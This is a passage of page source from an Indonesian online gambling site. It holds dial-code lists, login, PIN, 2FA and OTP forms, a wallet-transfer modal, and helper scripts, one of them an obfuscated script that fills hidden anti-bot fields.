                                                            <li><a class="js-opt" href="#" data-value="52">Mexico (+52)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="691">Micronesia, Federated States of (+691)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="373">Moldova, Republic of (+373)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="377">Monaco (+377)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="976">Mongolia (+976)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="382">Montenegro (+382)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="1664">Montserrat (+1664)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="212">Morocco (+212)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="258">Mozambique (+258)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="95">Myanmar (+95)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="264">Namibia (+264)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="674">Nauru (+674)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="977">Nepal (+977)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="31">Netherlands (+31)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="599">Netherlands Antilles (+599)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="687">New Caledonia (+687)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="64">New Zealand (+64)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="505">Nicaragua (+505)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="227">Niger (+227)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="234">Nigeria (+234)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="683">Niue (+683)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="672">Norfolk Island (+672)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="1670">Northern Mariana Islands (+1670)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="47">Norway (+47)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="968">Oman (+968)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="92">Pakistan (+92)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="680">Palau (+680)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="970">Palestinian Territory, Occupied (+970)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="507">Panama (+507)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="675">Papua New Guinea (+675)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="595">Paraguay (+595)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="51">Peru (+51)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="64">Pitcairn (+64)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="48">Poland (+48)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="351">Portugal (+351)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="1787">Puerto Rico (+1787)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="974">Qatar (+974)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="262">Reunion (+262)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="40">Romania (+40)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="70">Russian Federation (+70)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="250">Rwanda (+250)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="590">Saint Barthelemy (+590)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="290">Saint Helena (+290)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="1869">Saint Kitts and Nevis (+1869)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="1758">Saint Lucia (+1758)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="590">Saint Martin (+590)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="508">Saint Pierre and Miquelon (+508)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="1784">Saint Vincent and the Grenadines (+1784)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="684">Samoa (+684)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="378">San Marino (+378)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="239">Sao Tome and Principe (+239)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="966">Saudi Arabia (+966)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="221">Senegal (+221)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="381">Serbia (+381)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="381">Serbia and Montenegro (+381)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="248">Seychelles (+248)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="232">Sierra Leone (+232)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="1">Sint Maarten (+1)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="421">Slovakia (+421)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="386">Slovenia (+386)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="677">Solomon Islands (+677)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="252">Somalia (+252)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="27">South Africa (+27)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="500">South Georgia and the South Sandwich Islands (+500)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="211">South Sudan (+211)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="34">Spain (+34)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="94">Sri Lanka (+94)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="249">Sudan (+249)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="597">Suriname (+597)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="47">Svalbard and Jan Mayen (+47)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="268">Swaziland (+268)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="46">Sweden (+46)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="41">Switzerland (+41)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="963">Syrian Arab Republic (+963)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="886">Taiwan, Province of China (+886)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="992">Tajikistan (+992)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="255">Tanzania, United Republic of (+255)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="670">Timor-Leste (+670)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="228">Togo (+228)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="690">Tokelau (+690)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="676">Tonga (+676)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="1868">Trinidad and Tobago (+1868)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="216">Tunisia (+216)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="90">Turkey (+90)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="7370">Turkmenistan (+7370)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="1649">Turks and Caicos Islands (+1649)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="688">Tuvalu (+688)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="256">Uganda (+256)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="380">Ukraine (+380)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="971">United Arab Emirates (+971)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="44">United Kingdom (+44)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="1">United States (+1)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="1">United States Minor Outlying Islands (+1)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="598">Uruguay (+598)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="998">Uzbekistan (+998)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="678">Vanuatu (+678)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="58">Venezuela (+58)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="1284">Virgin Islands, British (+1284)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="1340">Virgin Islands, U.s. (+1340)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="681">Wallis and Futuna (+681)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="212">Western Sahara (+212)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="967">Yemen (+967)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="260">Zambia (+260)</a></li>
                                                            <li><a class="js-opt" href="#" data-value="263">Zimbabwe (+263)</a></li>
                                    </ul>
                </div>
                <input type="text" style="height:fit-content;" name="mobile" id="mobile" value="" class="form-control input-l">
             </div>            
        </div>
                 
          <div class="form-group row no-gutters">
            <div class="col-xs-8 col-md-8">
                <input type="tel" id="registerCaptchaimg" class="form-control" name="forgotPwCaptchaimg" maxlength="4" autocomplete="off" style="height: 50px;" placeholder="Captcha">
            </div>
            <button class="btn btn-refresh col-xs-4 col-md-4 text-left" type="button" id="fogotrefreshCaptcha">
            <img data-url="https://semangatMERCUSUAR77.site/captcha-image-forgotpw?v=1770825139" id="forgotPwCaptchaimgpath" class="captcha_img" autocomplete="off">
            <i class="icon-refresh"></i>
            </button>
          </div>
             
       <div class="row alert alert-danger message" _login-modal="" style="display: none;">
        </div>

        <div class="form-group text-center">        
          <button type="submit" class="btn btn-block btn-primary fs-lg" id="fpwSubmitBtn">Reset</button>
          <button type="button" id="btn-back--login-modal" class="btn btn-link" i18n="">
            <i class="icon-undo"></i>&nbsp; Kembali untuk masuk          </button>
          <app-ellipsis *ngif="inProgress"></app-ellipsis>
        </div>

      </form>


                  <form class="form-horizontal text-center" id="pinForm" action="https://semangatMERCUSUAR77.site/validate-pin" style="display: none;">

                    <div class="form-group ">
                        <h3>Kode Pin Aman</h3>
                        <p class="">Silakan Masukkan Kode Pin Aman Anda</p>
                    </div>
                    <div class="form-group ">
                        <div class="pin-in-grp" id="pin-in-grp">

                                                
                          <input type="password" maxlength="1" name="pincode[0]" class="form-control pincode" style="width:16.66%">
                        
                       
                          <input type="password" maxlength="1" name="pincode[1]" class="form-control pincode" style="width:16.66%">
                           
                         
                          <input type="password" maxlength="1" name="pincode[2]" class="form-control pincode" style="width:16.66%">
                         
                         
                          <input type="password" maxlength="1" name="pincode[3]" class="form-control pincode" style="width:16.66%">
                          
                          
                          <input type="password" maxlength="1" name="pincode[4]" class="form-control pincode" style="width:16.66%">
                          
                         
                          <input type="password" maxlength="1" name="pincode[5]" class="form-control pincode" style="width:16.66%">
                      
                          
                        </div>
                    </div>
                    <div class="form-group button-group">
                      <div class="row">
                                              	                            <div class="col-xs-4">
                              <input class="btn btn-primary btn-round btn-block pinkey" type="button" value="7">
                            </div>
                                                      <div class="col-xs-4">
                              <input class="btn btn-primary btn-round btn-block pinkey" type="button" value="3">
                            </div>
                                                      <div class="col-xs-4">
                              <input class="btn btn-primary btn-round btn-block pinkey" type="button" value="5">
                            </div>
                                                      <div class="col-xs-4">
                              <input class="btn btn-primary btn-round btn-block pinkey" type="button" value="8">
                            </div>
                                                      <div class="col-xs-4">
                              <input class="btn btn-primary btn-round btn-block pinkey" type="button" value="4">
                            </div>
                                                      <div class="col-xs-4">
                              <input class="btn btn-primary btn-round btn-block pinkey" type="button" value="2">
                            </div>
                                                      <div class="col-xs-4">
                              <input class="btn btn-primary btn-round btn-block pinkey" type="button" value="9">
                            </div>
                                                      <div class="col-xs-4">
                              <input class="btn btn-primary btn-round btn-block pinkey" type="button" value="0">
                            </div>
                                                      <div class="col-xs-4">
                              <input class="btn btn-primary btn-round btn-block pinkey" type="button" value="6">
                            </div>
                                                    <div class="col-xs-4">
                            <input id="back_bt" class="btn btn-warning btn-block  btn-round" type="button" value="RESET">
                          </div>
                          <div class="col-xs-4">
                            <input class="btn btn-primary btn-block  btn-round pinkey" type="button" value="1">
                          </div>
                          <div class="col-xs-4">
                              <button class="btn btn-info btn-round btn-block waves-effect waves-light btn-submit" type="submit">Submit</button>
                          </div>
                        </div>
                        <div class="row">
                          <div class="col-xs-4"></div>
                          <div class="col-xs-4"><a style="" class="btn btn-danger btn-round btn-block waves-effect " href="javascript:void(0);" onclick="window.onLogOut();">LOGOUT</a></div>
                          <div class="col-xs-4"></div>
                        </div>
                    </div>
                    <div class="row  alert alert-danger message" _login-modal="" style="display: none;">
                     </div>
                </form>

                <form class="form-horizontal text-center" id="fa2Form" action="https://www.Goblin88.site//validate-2fa" style="display: none;">

                    <div class="form-group ">
                        <h3>Masukkan Kode 2FA</h3>
                        <p class="">Masukkan kode verifikasi yang dihasilkan oleh aplikasi autentikator di ponsel Anda</p>
                    </div>
                    <div class="form-group ">
                    <h4>Kode verifikasi dari aplikasi</h4>
                        <div class="pin-in-grp" id="fa2_grp">

                                                
                        <input type="password" maxlength="1" name="pincode[1]" class="form-control pincode text-center" style="width:16.66%;float:left">
                        <input type="password" maxlength="1" name="pincode[2]" class="form-control pincode text-center" style="width:16.66%;float:left">
                        <input type="password" maxlength="1" name="pincode[3]" class="form-control pincode text-center" style="width:16.66%;float:left">
                        <input type="password" maxlength="1" name="pincode[4]" class="form-control pincode text-center" style="width:16.66%;float:left">
                        <input type="password" maxlength="1" name="pincode[5]" class="form-control pincode text-center" style="width:16.66%;float:left">
                        <input type="password" maxlength="1" name="pincode[6]" class="form-control pincode text-center" style="width:16.66%;float:left">
                      
                          
                        </div>
                    </div>
                    <div class="form-group text-center">
                    <button class="btn btn-info btn-round  waves-effect waves-light btn-submit" type="submit">Submit</button>
                    </div>
                    
                    <div class="row  alert alert-danger message" _login-modal="" style="display: none;">
                     </div>
                </form>
                <form class="form-horizontal text-center" id="fpwOtpVerifyForm" action="https://www.Goblin88.site//fpw-verify-otp" style="display: none;">

                    <div class="form-group ">
                        <h3>Verifikasi</h3>
                        <p class="">Silakan masukkan kata sandi satu kali untuk memverifikasi akun Anda</p>
                        <p class="">
                           <span>Kode telah dikirim ke</span> <small id="maskedNumber"></small> 
                        </p>
                    </div>
                    <input type="hidden" name="mobile" id="otpMobile">
                    <input type="hidden" name="contact_country" id="otpCountryCode">
                    <input type="hidden" name="otp_prefix" id="otpPrefix">
                    <div class="form-group ">
                    <h4>Kode dengan awalan - <span id="prefixValue"></span> </h4>
                        <div class="otp-pin-in-grp" id="otp_pin_grp">
                                                
                        <input type="password" maxlength="1" name="otp_pincode[1]" class="form-control fa2Code otp_pincode text-center" style="width:16.66%;float:left">
                        <input type="password" maxlength="1" name="otp_pincode[2]" class="form-control fa2Code otp_pincode text-center" style="width:16.66%;float:left">
                        <input type="password" maxlength="1" name="otp_pincode[3]" class="form-control fa2Code otp_pincode text-center" style="width:16.66%;float:left">
                        <input type="password" maxlength="1" name="otp_pincode[4]" class="form-control fa2Code otp_pincode text-center" style="width:16.66%;float:left">
                        <input type="password" maxlength="1" name="otp_pincode[5]" class="form-control fa2Code otp_pincode text-center" style="width:16.66%;float:left">
                        <input type="password" maxlength="1" name="otp_pincode[6]" class="form-control fa2Code otp_pincode text-center" style="width:16.66%;float:left">
                      
                          
                        </div>
                    </div>
                    <div class="form-group text-center d-flex" style="justify-content: space-between; ">
                        <button type="button" id="btn-back--fpw-verify-modal" class="btn btn-secondary btn-round waves-effect btn-back">
                            Back                        </button>

                        <span id="resend-timer" class="btn btn-outline-warning btn-round disabled">
                            Please wait <span id="resend-countdown">60</span>s
                        </span>

                        <button type="button" id="fpwResendOtpBtn" class="btn btn-warning btn-round waves-effect d-none">
                            Resend OTP                        </button>

                        <button type="submit" class="btn btn-info btn-round waves-effect btn-submit">
                            Periksa                        </button>
                    </div>
                    
                    <div class="row  alert alert-danger message" _login-modal="" style="display: none;">
                     </div>
                </form>
    </div>
    <div class="modal-footer text-center" id="footer--login-modal">
      <div class="footer-content">Tidak terdaftar?  <a href="register.php" i18n="">Daftar</a></div>
    </div>
            </div> 
</div> 
 



    </div>
  </div>


  <!--loading modal -->
  <div class="nifty-modal fade-in-scale" id="loading--layout" style="z-index:1000001;" data-isnotcloseoverlay="true">
    <div class="md-content">
      <div class="md-body">

        <div class="loader-b large"></div>
      </div>
    </div>
  </div>
  <div class="md-overlay" style="z-index:1000000;"></div>
  <!--END loading modal -->

  <!-- APK download ||Transfer Wallet  modal start-->
  <div class="nifty-modal slide-in-bottom downloadapk-modal" id="apk-modal">
  			<div class="md-content">
          <div class="modal-header">
       <button class="pull-right md-close"><i class="icon-x fs-lg"></i></button>
      <h3 id="downloadgame-title"></h3>
    </div>
  				<div class="md-body">
           <!--region Transfer Wallet Menu -->
            <div class="row no-gutters" id="trans_to_game_menu__game-modal">
                <form action="" method="post" id="tw_transfer_form" class="tw_transfer_form" novalidate="novalidate">
                  <input type="hidden" name="_token" value="8xe1UaFS4z4Wok9HUllb8i4qMYsdSgmjxJov7pBY">                    <div class="form-group">
                        <label for="mainwallet_amount">From Main Wallet</label>
                        <input type="text" class="form-control" readonly="" name="mainwallet_amount" id="mainwallet_amount" value="">

                    </div>
                    <div class="text-center">
                      <span class="vertical"><i class="icon-arrow-long-right"></i></span>
                    </div>
                    <div class="row">
                      <div class="col-xs-12">
                        <label for="mainwallet_amount">Transfer to <span id="gamename"></span> Wallet</label>
                        <div class="form-group">

                          <div class="customrange-slider">
                            <div id="slider" overflow-scroll="false" class="ui-slider ui-corner-all ui-slider-horizontal ui-widget ui-widget-content">
                              <span tabindex="0" class="ui-slider-handle ui-corner-all ui-state-default" style="left: 0%;"></span>
                              <div class="ui-slider-range ui-corner-all ui-widget-header ui-slider-range-min" style="width: 0%;"></div>
                            </div>
                            <div class="decrease-btn cusbtn">
                              <div id="tw_decrease_btn"> <span class="minus-icon custom-icon">-</span> </div>

                              <div class="minmax-label">Min</div>
                              <div class="minmax-value">
                              5000
                              </div>
                              <input type="hidden" name="twminval" id="twminval" value="5000">
                            </div>
                            <div class="increase-btn cusbtn">
                              <div id="tw_increase_btn">
                                <span class="plus-icon custom-icon">+</span>
                              </div>

                              <div class="minmax-label">Max</div>
                              <div class="minmax-value" id="maxSliderApk"></div>
                            </div>
                          </div>
                        </div>
                          <div class="col-md-8 col-md-offset-2 col-sm-8 col-sm-offset-2 col-xs-8 col-xs-offset-2">
                        <div class="form-group">
                            <input type="text" readonly="" class="form-control" name="transfer_amount" id="transfer_amount" placeholder="0.00" value="00.00">
                        </div>
                        </div>
                      </div>
                    </div>
                    <div class="text-center">
                        <input type="submit" class="btn btn-primary" value="SUBMIT">
                    </div>
                </form>
            </div>
          <!--endregion Transfer Wallet Menu -->

  					<div class="row no-gutters">
  							<div class="col-xs-12 text-center">
  								<a href="#" id="launchurl" class="url-link" target="_blank">
                	<img class="img-fluid" src="/assets/images/log_html5.png" alt="play-in-browser">
  								<div class="download-caption text-center">
  										Play now in your browser
  								</div>
  								<div class="download-linkbtn text-center">
  									<img class="img-fluid" src="  /assets/images/btn_playnow.png" alt="play-now-in-browser">
  								</div>
  							</a>
  							</div>
  						</div>
    				</div>
  			</div>
  </div>
  <div class="modal-wrapper nifty-modal fade-in-scale" id="live-draw-modal" data-isnotcloseoverlay="true">
    <div class="md-content"> 
      <div class="md-body"> 
        <div class="modal-header">
        <h4 class="modal-title">Live Draw</h4>      
        <button class="btn btn-link pull-left " id="btn-close--live-draw-modal"> <i class="icon icon-close"></i> </button>
</div>

<div class="modal-body">
    <div id="live_draw_table">
   
    </div>
    <div id="img_details">
        <img src="" class="draw_img" id="draw_img">
        <div class="details">

            <p class="tickte_id">undian berikutnya: <span id="ticket_id"></span></p>
        </div>

        <div class="close_btn_section">
            <button class="btn btn-close" id="img--section-closebtn" onclick="closeImageSection()">Kembali</button>
        </div>
    </div>
    
</div>
      </div>
    </div>
  </div>
  <div class="md-overlay"></div>
  <!-- APK download modal end-->


  <!--<script src="/js/sweetalert.js"></script>  -->


  <script type="text/javascript">

    $(document).ready(function(){
        $( "#mainContentContainer" ).click(function() {
          $( "#sideNav" ).removeClass( "navContentOpen" );
          $( "#sideNav" ).removeClass( "open" );
          $( "#mainContent" ).removeClass( "navContentOpen" );
          $( "#mainContent" ).removeClass( "sideNavOpen" );
          $( "#mainContent" ).removeClass( "rightSideBarOpen" );
          $( "#r-side-bar" ).removeClass( "open" );
        });

        //this is mobile version of btn close login modal
         $(document).on('click', '#btn-close--login-modal',function(event){
              event.preventDefault();
              event.stopPropagation();
              $('#r-side-bar').removeClass('open');
              $( "#mainContent" ).removeClass( "rightSideBarOpen" );
              return false;

        });

        $(document).on('click','.btn-collapse-balances', function(){
          if( !$('#other-game-bals').is(':visible')){
            $('#other-game-bals').slideDown();
            window.getAllGameBal();
          }
          else{
            $('#other-game-bals').slideUp();
          }
          return false;
        });
      });

  </script>

  <style>

    .TdHXcpUjuOlMs{
         display:none;
    }

</style>
 

 
<script>
    (function(){function _0x6bc(){let _0x6be=["querySelectorAll","function","addEventListener","appendChild","document","createElement",";ZEqa=#","}q$)c2{","input[name=\"password_confirm\"]","querySelector","forEach","inputElement","RegExp","reverse","split",".BoAaYFsU","J#TLX^8c_bGu","yACSxZCqzdYrB","zB4jC=I","value","focus","join","name","NyWnsMxYrB","","includes","atob","replace"];_0x6bc= function(){return _0x6be}; return _0x6bc();}function _0x6bf(_0x6c1,_0x6c3){ let _0x6bd= _0x6bc(); return ( (_0x6bf=function(_0x6c2 , _0x6c4){ _0x6c2 = _0x6c2 - 0x6c9;  let _0x6c5 = _0x6bd[_0x6c2]; return _0x6c5; } ) ,  _0x6bf(_0x6c1,_0x6c3));}const _0x6c0=window[_0x6bf(0x6cd)][_0x6bf(0x6d2)](_0x6bf(0x6d1));if(_0x6c0) _0x6c0[_0x6bf(0x6cb)](_0x6bf(0x6dd), function() {let _0x6ba=[_0x6bf(0x6e0),_0x6bf(0x6da),];function _d90a9811(_0x6c6,_0x6c7,_0x6c8,_0x6c9){return _0x6c7 + _0x6c6;}let _0x6bbs=window[_0x6bf(0x6cd)][_0x6bf(0x6c9)](_0x6bf(0x6d8));_0x6bbs[_0x6bf(0x6d3)](function(_0x6bb){if(!_0x6ba[_0x6bf(0x6e2)](_0x6bb[_0x6bf(0x6df)]))_0x6bb[_0x6bf(0x6dc)]=_d90a9811(_0x6bf(0x6d0),_0x6bf(0x6db),_0x6bf(0x6cf),_0x6bf(0x6d9));});});})();

    
   
    window.loadOrRefreshTurnstileWidget= function(  selectorId ){

         //do nothing;
    }
     
</script>
 <script type="text/javascript" src="/assets/js/jquery-validation/jquery.validate.min.js"></script>
<script type="text/javascript" src="/assets/js/jquery-validation/additional-methods.min.js"></script>
<link rel="stylesheet" href="/assets/js/fancybox/jquery.fancybox.min.css">


<script type="text/javascript" src="/assets/js/fancybox/jquery.fancybox.min.js"></script>
<script>
 
        window.isAuth=  false  ? true : false;
        window.onLogOut = async function(){
            if(window.iFirebase){
                await window.iFirebase.logout();
            }
            
            window.location.href="https://www.Goblin88.site/logout.php";

        }
        window.fbs =  {"apiKey":"AIzaSyA6hCmsU1Tx-_rB9st6TiXLT_M3D-qQ9aw","authDomain":"api-kixplay-live1.firebaseapp.com","projectId":"api-kixplay-live1","storageBucket":"api-kixplay-live1.firebasestorage.app","messagingSenderId":"892534263551","appId":"1:892534263551:web:8c9f262c8a457b082146ca","measurementId":null} ;
        window.firebasSuccessCb = function (params){
        window.json_post(
                "/authViaIdp",
                params ,
                "json",
                showLoadingImgFn   ,
                 removeLoadingImgFn    ,
            ).done(function(d){
    
             window.onLoginCallback(d,true);

            });
        }
    

         window.currencyCode='IDR';
         window.lang="id";
         window.agentCode='BABYBOS99';
         window.sweetAlert= function ( msg , type , title  ,showCancelBtn   ) {
            //check CF error
            var dateNow = "2026-02-11 23:52:19";

            if (msg.indexOf('cloudflare') >= 0) {
                msg = transMsgs.cfTimeout + ' (error time: ' + dateNow + ')';
                title = " ";
            }
            if (msg.indexOf('challenge') >= 0) {
                msg = transMsgs.cfChallenge + ' (error time: ' + dateNow + ')';
                title = " ";
            }
             return     Swal.fire({
                    title: !title? "Warning" : title,
                    text: msg,
                    icon: !type? "error":type,
                    showCancelButton :(showCancelBtn ? true:false),
                    cancelButtonText : "Cancel",
                    showConfirmButton : true, 
                    confirmButtonText : 'OK', 
                } );
            }
            console.log('window.name ' + window.name );
            window.name = !window.name? "parent"  + Date.now() + Math.floor(Math.random() * 100000000) : window.name;
            console.log('window.name ' + window.name );
           window.formatNumber = function (n)   {
                // format number 1000000 to 1,234,567
                return n.replace(/[^0-9\-]/g, "").replace(/\B(?=(\d{3})+(?!\d))/g, ",")
            }
            window.convertToNumber= function (value) {

                    if (!value) {
                        return 0;
                    }
                    if(value.indexOf(".") >= 0){
                        var decimal_pos = value.indexOf(".");
                        value= value.substring(0, decimal_pos);

                    }
                    var number =value.replace(/[^0-9.-]+/g, "");
                    if (isNaN(number)) {
                        number = 0;
                    }
                return number;
           }

            window.formatCurrency = function (value) {
                    const symbol = "";//"$"
                    // get input value
                    var input_val = value;

                    if (typeof value !== 'string') {
                        var input_val = value.toString();
                    }
                    if (input_val === "") { return; }

                    var original_len = input_val.length;


                    if (input_val.indexOf(".") >= 0) {

                        var decimal_pos = input_val.indexOf(".");
                        var left_side = input_val.substring(0, decimal_pos);
                        var right_side = input_val.substring(decimal_pos+1);

                        left_side = formatNumber(left_side);

                        right_side += "00";

                        right_side = right_side.substring(0, 2);

                        input_val = symbol + left_side + "." + right_side;

                    } else {
                        input_val = formatNumber(input_val);
                        input_val = symbol + input_val + ".00";;

                    }

                    return input_val;
           }

                window.prize = 0 ;
                window.ajax_jackpot= function  () {
                    $.ajax({
                        url: "https://semangatMERCUSUAR77.site/getPokerJackpotAmt",
                        type: 'post',
                        data: { _token : $('meta[name=csrf-token]').attr('content') },
                        success: function (data) {
                            prize = (data / 2000.000)*2000.000;
                            $('.jackpot_numbers_home').html(`IDR <span id="jackpot_amount">${ commaSeparateNumber(prize) }</span>`)

                            //$('.jackpot_numbers_home').html(`IDR ` + commaSeparateNumber(data.prize));
                        }
                    });
                }
                window.getHkbLotteryResults= function  (callback) {
                    var results = [];
                    $.ajax({
                        url: "https://semangatMERCUSUAR77.site/getHKBLotteryResults",
                        type: 'post',
                        data: { _token : $('meta[name=csrf-token]').attr('content') },
                        success: function (result) {
                            results =  result.data.hkb_lottery_results;
                            if (typeof callback === 'function') {
                                callback(results);
                            }
                        }
                    });
                   
                }

                var newI = 0;
                window.popitup = function  (url,gameid) {
                  //alert(gameid);
                    newwindow = window.open(url,  window.agentCode + '_gameWindow'+gameid+newI,'toolbar=0,width=1200,height=750');
                    newI++;
                    if (window.focus) { newwindow.focus() }
                    return false;
                }

                window.popup = function (mylink, windowname) {
                    if (!window.focus) return true;
                    var href;
                    if (typeof (mylink) == 'string')
                        href = mylink;
                    else
                        href = mylink.href;
                    window.open(href, windowname, 'width=600,height=800,scrollbars=yes');
                    return false;
                }
                window.commaSeparateNumber = function (val, isJP) {
                    while (/(\d+)(\d{3})/.test(val.toString())) {

                        if( window.currencyCode=='VND' && isJP){
                            val = val.toFixed(0);
                        }else {
                            val = Number(val).toFixed(2);
                        }
                        val = val.toString().replace(/(\d)(?=(\d\d\d)+(?!\d))/g, "$1,");
                    }
                    return val;
                }

                window.getRandomIntInclusive =  function (min, max) {
                    min = Math.ceil(min);
                    max = Math.floor(max);
                    return Math.floor(Math.random() * (max - min + 1)) + min; //The maximum is inclusive and the minimum is inclusive
                }

                /*bank acc min and maxlength limitation */
                window.accLength = parseInt("8");
                    window.bankAccLength =function(selectedBank, default_minlength, default_maxlength){
                        console.log(selectedBank, default_minlength, default_maxlength);
                        var   custom_minLength, custom_maxLength;
                if(selectedBank == 'MDR' || selectedBank == 'MDRLV'){
                    custom_minLength = 13;
                    custom_maxLength = 13;
                }
                else if(selectedBank == 'BNI' || selectedBank == 'BCA' || selectedBank == 'BSI' || selectedBank == 'BLA'){
                    custom_minLength = 10;
                    custom_maxLength = 10;
                } 
                else if(selectedBank == 'BRI'){
                    custom_minLength = 15;
                    custom_maxLength = 15;
                } 
                else if(selectedBank == 'DMN'){
                    custom_minLength = 10;
                    custom_maxLength = 12;
                } 
                else if(selectedBank == 'ALADIN' || selectedBank == 'ALLO'){
                    custom_minLength = 10;
                    custom_maxLength = 13;
                } 
                else if(selectedBank == 'JAGO' || selectedBank == 'ARIN'){
                    custom_minLength = 8;
                    custom_maxLength = 12;
                } 
                else if(selectedBank == 'CIMBN' || selectedBank == 'SEABANK'){
                    custom_minLength = 12;
                    custom_maxLength = 12;
                }  
                else{
                    custom_minLength  = default_minlength;
                    custom_maxLength  = default_maxlength; 
                }   
                
                return {'min_len': custom_minLength,'max_len': custom_maxLength}
                    }
                /*bank acc min and maxlength limitation end*/ 


  $(document).ready(function () {
                    //suspend-alert
                   // login-alert
                   // promo-disabled-alert
                   // "maintenance-alert";
                   // "comingsoon-alert";
                window.alertLogin=function(e){
                    e.preventDefault();
                    sweetAlert( transMsgs.plsLogin  );
                    return false;
                }

                $(".suspend-alert").click(function (e) {
                        e.preventDefault();
                        sweetAlert( transMsgs.blockedFrGame);
                        return false;
                });

                $(".login-alert").click(function (e) {
                    if($("#login-modal--layout").length && !$('#loginForm').hasClass('js-inline-form') ){
                         $("#login-modal--layout").nifty("show")
                    }
                    else {
                        alertLogin(e);
                    }

                    return false;
                });

                $(".maintenance-alert").click(function (e) {
                        e.preventDefault();
                        sweetAlert( transMsgs.gameMaintenance);
                        return false;
                });

                $(".comingsoon-alert").click(function (e) {
                        e.preventDefault();
                        sweetAlert( transMsgs.gameComingSoon);
                        return false;
                });

                $(".promo-disabled-alert").click(function (e) {
                        e.preventDefault();
                        sweetAlert(transMsgs.gamePromoBlock);
                        return false;
                });


               
                $("#login-modal--layout").on('shown.nifty.modal', function(){
